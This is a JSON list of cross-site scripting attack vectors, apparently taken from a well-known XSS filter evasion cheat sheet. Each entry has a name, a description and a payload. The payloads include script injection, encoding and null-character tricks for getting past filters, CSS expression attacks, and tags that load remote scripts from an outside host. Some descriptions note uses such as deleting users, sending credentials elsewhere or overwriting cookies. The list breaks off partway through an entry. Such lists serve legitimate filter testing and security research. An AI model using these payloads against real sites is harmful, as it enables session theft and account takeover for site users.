[
   {
      "description" : "Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word \"XSS\" will pop up.  You'll need to replace the \"&\" with \"%26\" if you are submitting this XSS string via HTTP GET or it will be ignored and everything after it will be interpreted as another variable.  Tip: If you're in a rush and need to quickly check a page, often times injecting the deprecated \"<PLAINTEXT>\" tag will be enough to check to see if something is vulnerable to XSS by messing up the output appreciably.",
      "name" : "XSS Locator",
      "vector" : "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}"
   },
   {
      "description" : "If you don't have much space, this string is a nice compact XSS injection check. View source after injecting it and look for <XSS versus &lt;XSS to see if it is vulnerable.",
      "name" : "XSS Quick Test",
      "vector" : "'';!--\"<XSS>=&{()}"
   },
   {
      "description" : "Basic injection attack",
      "name" : "SCRIPT w/Alert()",
      "vector" : "<SCRIPT>alert('XSS')</SCRIPT>"
   },
   {
      "description" : "No filter evasion. This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here).",
      "name" : "SCRIPT w/Source File",
      "vector" : "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>"
   },
   {
      "description" : "Inject this string, and in most cases where a script is vulnerable with no special XSS vector requirements the word \"XSS\" will pop up.",
      "name" : "SCRIPT w/Char Code",
      "vector" : "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
   },
   {
      "description" : "Works in IE and Netscape 8.1 in safe mode.  You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render.  Also, this relies on the fact that the website uses dynamically placed images like \"images/image.jpg\" rather than full paths.  If the path includes a leading forward slash like \"/images/image.jpg\" you can remove one slash from this vector (as long as there are two to begin the comment this will work",
      "name" : "BASE",
      "vector" : "<BASE HREF=\"javascript:alert('XSS');//\">"
   },
   {
      "description" : "BGSOUND",
      "name" : "BGSOUND",
      "vector" : "<BGSOUND SRC=\"javascript:alert('XSS');\">"
   },
   {
      "description" : "BODY image",
      "name" : "BODY background-image",
      "vector" : "<BODY BACKGROUND=\"javascript:alert('XSS');\">"
   },
   {
      "description" : "BODY tag (I like this method because it doesn't require using any variants of \"javascript:\" or \"<SCRIPT...\" to accomplish the XSS attack)",
      "name" : "BODY ONLOAD",
      "vector" : "<BODY ONLOAD=alert('XSS')>"
   },
   {
      "description" : "Div background-image",
      "name" : "DIV background-image 1",
      "vector" : "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">"
   },
   {
      "description" : "Div background-image plus extra characters.  I built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course.  (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8203, 12288, 65279)",
      "name" : "DIV background-image 2",
      "vector" : "<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">"
   },
   {
      "description" : "Div expression - a variant of this was effective against a real world cross site scripting filter using a newline between the colon and \"expression\"",
      "name" : "DIV expression",
      "vector" : "<DIV STYLE=\"width: expression(alert('XSS'));\">"
   },
   {
      "description" : "Frame (Frames have the same sorts of XSS problems as iframes).",
      "name" : "FRAME",
      "vector" : "<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>"
   },
   {
      "description" : "Iframe (If iframes are allowed there are a lot of other XSS problems as well).",
      "name" : "IFRAME",
      "vector" : "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>"
   },
   {
      "description" : "INPUT Image",
      "name" : "INPUT Image",
      "vector" : "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">"
   },
   {
      "description" : "Image XSS using the JavaScript directive.",
      "name" : "IMG w/JavaScript Directive",
      "vector" : "<IMG SRC=\"javascript:alert('XSS');\">"
   },
   {
      "description" : "No quotes and no semicolon",
      "name" : "IMG No Quotes/Semicolon",
      "vector" : "<IMG SRC=javascript:alert('XSS')>"
   },
   {
      "description" : "IMG Dynsrc",
      "name" : "IMG Dynsrc",
      "vector" : "<IMG DYNSRC=\"javascript:alert('XSS');\">"
   },
   {
      "description" : "IMG Lowsrc",
      "name" : "IMG Lowsrc",
      "vector" : "<IMG LOWSRC=\"javascript:alert('XSS');\">"
   },
   {
      "description" : "This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.",
      "name" : "IMG Embedded commands 1",
      "vector" : "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">"
   },
   {
      "description" : "IMG Embedded commands part II - this is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=\"http://badguy.com/a.jpg\"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this).",
      "name" : "IMG Embedded commands 2",
      "vector" : "Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser"
   },
   {
      "description" : "IMG STYLE with expression (this is really a hybrid of several CSS XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like the other CSS examples this can send IE into a loop).",
      "name" : "IMG STYLE w/expression",
      "vector" : "exp/*<XSS STYLE='no\\xss:noxss(\"*//*\");\nxss:&#101;x&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'>"
   },
   {
      "description" : "Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector.",
      "name" : "List-style-image",
      "vector" : "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS"
   },
   {
      "description" : "VBscript in an image",
      "name" : "IMG w/VBscript",
      "vector" : "<IMG SRC='vbscript:msgbox(\"XSS\")'>"
   },
   {
      "description" : "Layer (Older Netscape only)",
      "name" : "LAYER",
      "vector" : "<LAYER SRC=\"http://ha.ckers.org/scriptlet.html\"></LAYER>"
   },
   {
      "description" : "Livescript (Older Netscape only)",
      "name" : "Livescript",
      "vector" : "<IMG SRC=\"livescript:[code]\">"
   },
   {
      "description" : "Found by Kurt Huwig http://www.iku-ag.de/ This uses malformed ASCII encoding with 7 bits instead of 8.  This XSS may bypass many content filters but only works if the hosts transmits in US-ASCII encoding, or if you set the encoding yourself.  This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion.  Apache Tomcat is the only known server that transmits in US-ASCII encoding.",
      "name" : "US-ASCII encoding",
      "vector" : "%BCscript%BEalert(%A2XSS%A2)%BC/script%BE"
   },
   {
      "description" : "The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs.",
      "name" : "META",
      "vector" : "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">"
   },
   {
      "description" : "This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, since it utilizes base64 encoding. Please see http://www.ietf.org/rfc/rfc2397.txt for more details",
      "name" : "META w/data:URL",
      "vector" : "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">"
   },
   {
      "description" : "Meta with additional URL parameter. If the target website attempts to see if the URL contains an \"http://\" you can evade it with the following technique (Submitted by Moritz Naumann http://www.moritz-naumann.com)",
      "name" : "META w/additional URL parameter",
      "vector" : "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">"
   },
   {
      "description" : "Mocha (Older Netscape only)",
      "name" : "Mocha",
      "vector" : "<IMG SRC=\"mocha:[code]\">"
   },
   {
      "description" : "If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag. The linked file is actually an HTML file that can contain your XSS",
      "name" : "OBJECT",
      "vector" : "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://ha.ckers.org/scriptlet.html\"></OBJECT>"
   },
   {
      "description" : "Using an OBJECT tag you can embed XSS directly (this is unverified).",
      "name" : "OBJECT w/Embedded XSS",
      "vector" : "<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>"
   },
   {
      "description" : "Using an EMBED tag you can embed a Flash movie that contains XSS. If you add the attributes allowScriptAccess=\"never\" and allownetworking=\"internal\" it can mitigate this risk (thank you to Jonathan Vanasco for the info). Demo: http://ha.ckers.org/weird/xssflash.html :",
      "name" : "Embed Flash",
      "vector" : "<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>"
   },
   {
      "description" : "Using this action script inside flash can obfuscate your XSS vector.",
      "name" : "OBJECT w/Flash 2",
      "vector" : "a=\"get\";&#10;b=\"URL(\"\";&#10;c=\"javascript:\";&#10;d=\"alert('XSS');\")\";\neval(a+b+c+d);"
   },
   {
      "description" : "STYLE tag (Older versions of Netscape only)",
      "name" : "STYLE",
      "vector" : "<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>"
   },
   {
      "description" : "STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one)",
      "name" : "STYLE w/Comment",
      "vector" : "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">"
   },
   {
      "description" : "Anonymous HTML with STYLE attribute (IE and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter)",
      "name" : "STYLE w/Anonymous HTML",
      "vector" : "<XSS STYLE=\"xss:expression(alert('XSS'))\">"
   },
   {
      "description" : "STYLE tag using background-image.",
      "name" : "STYLE w/background-image",
      "vector" : "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>"
   },
   {
      "description" : "STYLE tag using background.",
      "name" : "STYLE w/background",
      "vector" : "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>"
   },
   {
      "description" : "Stylesheet",
      "name" : "Stylesheet",
      "vector" : "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"
   },
   {
      "description" : "Remote style sheet (using something as simple as a remote style sheet you can include your XSS as the style question redefined using an embedded expression.) This only works in IE and Netscape 8.1+ in IE rendering engine mode.  Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page.",
      "name" : "Remote Stylesheet 1",
      "vector" : "<LINK REL=\"stylesheet\" HREF=\"http://ha.ckers.org/xss.css\">"
   },
   {
      "description" : "Remote style sheet part 2 (this works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop http://www.hacker.co.il/security/ie/css_import.html.  As a side note you can remote the end STYLE tag if there is HTML immediately after the vector to close it.  This is useful if you cannot have either an equal sign or a slash in your cross site scripting attack, which has come up at least once in the real world.",
      "name" : "Remote Stylesheet 2",
      "vector" : "<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"
   },
   {
      "description" : "Remote style sheet part 3. This only works in Opera but is fairly tricky.  Setting a link header is not part of the HTTP1.1 spec. However, some browsers still allow it (like Firefox and Opera).  The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://ha.ckers.org/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox.",
      "name" : "Remote Stylesheet 3",
      "vector" : "<META HTTP-EQUIV=\"Link\" Content=\"<http://ha.ckers.org/xss.css>; REL=stylesheet\">"
   },
   {
      "description" : "Remote style sheet part 4.  This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites.",
      "name" : "Remote Stylesheet 4",
      "vector" : "<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>"
   },
   {
      "description" : "Table background (who would have thought tables were XSS targets... except me, of course).",
      "name" : "TABLE",
      "vector" : "<TABLE BACKGROUND=\"javascript:alert('XSS')\"></TABLE>"
   },
   {
      "description" : "TD background.",
      "name" : "TD",
      "vector" : "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\"></TD></TABLE>"
   },
   {
      "description" : "XML namespace. The .htc file must be located on the server as your XSS vector.",
      "name" : "XML namespace",
      "vector" : "<HTML xmlns:xss>\n<?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\">\n<xss:xss>XSS</xss:xss>\n</HTML>"
   },
   {
      "description" : "XML data island with CDATA obfuscation (this XSS attack works only in IE and Netscape 8.1 IE rendering engine mode) - vector found by Sec Consult http://www.sec-consult.html while auditing Yahoo.",
      "name" : "XML data island w/CDATA",
      "vector" : "<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas]]><![CDATA[cript:alert('XSS');\">]]>\n</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>"
   },
   {
      "description" : "XML data island with comment obfuscation (doesn't use CDATA fields, but rather uses comments to break up the javascript directive)",
      "name" : "XML data island w/comment",
      "vector" : "<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>\n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>"
   },
   {
      "description" : "Locally hosted XML with embedded JavaScript that is generated using an XML data island. This is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains the cross site scripting vector.",
      "name" : "XML (locally hosted)",
      "vector" : "<XML SRC=\"http://ha.ckers.org/xsstest.xml\" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
   },
   {
      "description" : "HTML+TIME in XML. This is how Grey Magic http://www.greymagic.com/security/advisories/gm005-mc/ hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work.",
      "name" : "XML HTML+TIME",
      "vector" : "<HTML><BODY>\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\n<?import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>\"> </BODY></HTML>"
   },
   {
      "description" : "Downlevel-Hidden block (only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode).  Some websites consider anything inside a comment block to be safe and therefore it does not need to be removed, which allows our XSS vector. Or the system could add comment tags around something to attempt to render it harmless.  As we can see, that probably wouldn't do the job.",
      "name" : "Commented-out Block",
      "vector" : "<!--[if gte IE 4]>\n<SCRIPT>alert('XSS');</SCRIPT>\n<![endif]-->"
   },
   {
      "description" : "Cookie manipulation - admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can user it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc).",
      "name" : "Cookie Manipulation",
      "vector" : "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">"
   },
   {
      "description" : "This uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute.",
      "name" : "Local .htc file",
      "vector" : "<XSS STYLE=\"behavior: url(http://ha.ckers.org/xss.htc);\">"
   },
   {
      "description" : "Assuming you can only fit in a few characters and it filters against \".js\" you can rename your JavaScript file to an image as an XSS vector.",
      "name" : "Rename .js to .jpg",
      "vector" : "<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>"
   },
   {
      "description" : "SSI (Server Side Includes) requires SSI to be installed on the server to use this XSS vector.  I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues.",
      "name" : "SSI",
      "vector" : "<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'\"-->"
   },
   {
      "description" : "PHP - requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues.",
      "name" : "PHP",
      "vector" : "<? echo('<SCR)';\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>"
   },
   {
      "description" : "&JavaScript includes (works in Netscape 4.x).",
      "name" : "JavaScript Includes",
      "vector" : "<BR SIZE=\"&{alert('XSS')}\">"
   },
   {
      "description" : "All of the possible combinations of the character \"<\" in HTML and JavaScript.  Most of these won't render, but many of them can get rendered in certain circumstances (standards are great, aren't they?).",
      "name" : "Character Encoding Example",
      "vector" : "<\n%3C\n&lt\n&lt;\n&LT\n&LT;\n&#60\n&#060\n&#0060\n&#00060\n&#000060\n&#0000060\n&#60;\n&#060;\n&#0060;\n&#00060;\n&#000060;\n&#0000060;\n&#x3c\n&#x03c\n&#x003c\n&#x0003c\n&#x00003c\n&#x000003c\n&#x3c;\n&#x03c;\n&#x003c;\n&#x0003c;\n&#x00003c;\n&#x000003c;\n&#X3c\n&#X03c\n&#X003c\n&#X0003c\n&#X00003c\n&#X000003c\n&#X3c;\n&#X03c;\n&#X003c;\n&#X0003c;\n&#X00003c;\n&#X000003c;\n&#x3C\n&#x03C\n&#x003C\n&#x0003C\n&#x00003C\n&#x000003C\n&#x3C;\n&#x03C;\n&#x003C;\n&#x0003C;\n&#x00003C;\n&#x000003C;\n&#X3C\n&#X03C\n&#X003C\n&#X0003C\n&#X00003C\n&#X000003C\n&#X3C;\n&#X03C;\n&#X003C;\n&#X0003C;\n&#X00003C;\n&#X000003C;\n\\x3c\n\\x3C\n\\u003c\n\\u003C"
   },
   {
      "description" : "Case insensitive XSS attack vector.",
      "name" : "Case Insensitive",
      "vector" : "<IMG SRC=JaVaScRiPt:alert('XSS')>"
   },
   {
      "description" : "HTML entities (the semicolons are required for this to work).",
      "name" : "HTML Entities",
      "vector" : "<IMG SRC=javascript:alert(&quot;XSS&quot;)>"
   },
   {
      "description" : "Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).",
      "name" : "Grave Accents",
      "vector" : "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>"
   },
   {
      "description" : "If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.",
      "name" : "Image w/CharCode",
      "vector" : "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
   },
   {
      "description" : "UTF-8 Unicode encoding (all of the XSS examples that use a javascript: directive inside of an IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).",
      "name" : "UTF-8 Unicode Encoding",
      "vector" : "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>"
   },
   {
      "description" : "Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for \"&#XX;\", since most people don't know about padding - up to 7 numeric characters total).  This is also useful against people who decode against strings like $tmp_string =~ s/.*\\&#(\\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate an html encoded string (I've seen this in the wild).",
      "name" : "Long UTF-8 Unicode w/out Semicolons",
      "vector" : "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
   },
   {
      "description" : "DIV background-image with unicoded XSS exploit (this has been modified slightly to obfuscate the url parameter).  The original vulnerability was found by Renaud Lifchitz (http://www.sysdream.com) as a vulnerability in Hotmail.",
      "name" : "DIV w/Unicode",
      "vector" : "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">"
   },
   {
      "description" : "Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string = ~ s/.*\\&#(\\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).",
      "name" : "Hex Encoding w/out Semicolons",
      "vector" : "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
   },
   {
      "description" : "UTF-7 encoding - if the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one). You don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 IE rendering engine mode). Watchfire  http://seclists.org/lists/fulldisclosure/2005/Dec/1107.html found this hole in Google's custom 404 script.",
      "name" : "UTF-7 Encoding",
      "vector" : "<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"
   },
   {
      "description" : "Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: <SCRIPT>var a=\"$ENV{QUERY_STRING}\";</SCRIPT> and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read <SCRIPT>var a=\"\";alert('XSS');//\";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.",
      "name" : "Escaping JavaScript escapes",
      "vector" : "\\\";alert('XSS');//"
   },
   {
      "description" : "This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.",
      "name" : "End title tag",
      "vector" : "</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>"
   },
   {
      "description" : "STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).",
      "name" : "STYLE w/broken up JavaScript",
      "vector" : "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>"
   },
   {
      "description" : "Embedded tab to break up the cross site scripting attack.",
      "name" : "Embedded Tab",
      "vector" : "<IMG SRC=\"jav\tascript:alert('XSS');\">"
   },
   {
      "description" : "Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.",
      "name" : "Embedded Encoded Tab",
      "vector" : "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"
   },
   {
      "description" : "Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.",
      "name" : "Embedded Newline",
      "vector" : "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">"
   },
   {
      "description" : "Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).",
      "name" : "Embedded Carriage Return",
      "vector" : "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">"
   },
   {
      "description" : "Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).",
      "name" : "Multiline w/Carriage Returns",
      "vector" : "<IMG\rSRC\r=\r\"\rj\ra\rv\ra\rs\rc\rr\ri\rp\rt\r:\ra\rl\re\rr\rt\r(\r'\rX\rS\rS\r'\r)\r\"\r>\r"
   },
   {
      "description" : "Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.",
      "name" : "Null Chars 1",
      "vector" : "perl -e 'print \"<IMG SRC=java\\0script:alert(\"XSS\")>\";'> out"
   },
   {
      "description" : "Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I've seen this vector bypass some of the most restrictive XSS filters to date",
      "name" : "Null Chars 2",
      "vector" : "perl -e 'print \"&<SCR\\0IPT>alert(\"XSS\")</SCR\\0IPT>\";' > out"
   },
   {
      "description" : "Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word \"javascript:\" - which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the \"javascript:\" keyword. The actual reality is you can have any char from 1-32 in decimal).",
      "name" : "Spaces/Meta Chars",
      "vector" : "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
   },
   {
      "description" : "Non-alpha-non-digit XSS.  While I was reading the Firefox HTML parser I found that it assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag.  The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.  For example \"<SCRIPT\\s\" != \"<SCRIPT/XSS\\s\"",
      "name" : "Non-Alpha/Non-Digit",
      "vector" : "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>"
   },
   {
      "description" : "Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.",
      "name" : "Non-Alpha/Non-Digit Part 2",
      "vector" : "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>"
   },
   {
      "description" : "In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don't actually need the \"></SCRIPT>\" portion of this Cross Site Scripting vector. Firefox assumes it's safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn't affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they're not needed generally.",
      "name" : "No Closing Script Tag",
      "vector" : "<SCRIPT SRC=http://ha.ckers.org/xss.js"
   },
   {
      "description" : "This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh's protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a </SCRIPT> tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The \".j\" is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.",
      "name" : "Protocol resolution in script tags",
      "vector" : "<SCRIPT SRC=//ha.ckers.org/.j>"
   },
   {
      "description" : "Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the \"javascript:\" directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close > tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:\n\t/((\\%3D)|(=))[^\\n]*((\\%3C)|<)[^\\n]+((\\%3E)|>)/ \nAs a side note, this was also effective against a real world XSS filter I came across using an open ended <IFRAME tag instead of an <IMG tag.",
      "name" : "Half-Open HTML/JavaScript",
      "vector" : "<IMG SRC=\"javascript:alert('XSS')\""
   },
   {
      "description" : "This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it's surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won't",
      "name" : "Double open angle brackets",
      "vector" : "<IFRAME SRC=http://ha.ckers.org/scriptlet.html <"
   },
   {
      "description" : "(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.",
      "name" : "Extraneous Open Brackets",
      "vector" : "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"
   },
   {
      "description" : "Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.",
      "name" : "Malformed IMG Tags",
      "vector" : "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"
   },
   {
      "description" : "No single quotes or double quotes or semicolons.",
      "name" : "No Quotes/Semicolons",
      "vector" : "<SCRIPT>a=/XSS/\nalert(a.source)</SCRIPT>"
   },
   {
